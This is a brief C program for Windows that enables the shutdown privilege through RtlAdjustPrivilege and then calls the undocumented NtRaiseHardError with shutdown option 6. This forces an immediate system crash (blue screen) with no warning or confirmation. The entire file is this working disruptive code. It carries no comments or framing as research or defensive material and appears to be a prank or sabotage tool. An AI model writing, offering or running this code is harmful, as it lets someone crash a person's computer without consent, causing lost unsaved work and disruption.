#include <windows.h>

typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI *TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");

    if (hNtdll != NULL)
    {
        NTSTATUS s1, s2;
        BOOLEAN b;
        ULONG r;

        TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        s1 = pfnRtlAdjustPrivilege(19, TRUE, FALSE, &b);

        TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
        s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, NULL, 6, &r);
    }
    return 0;
}
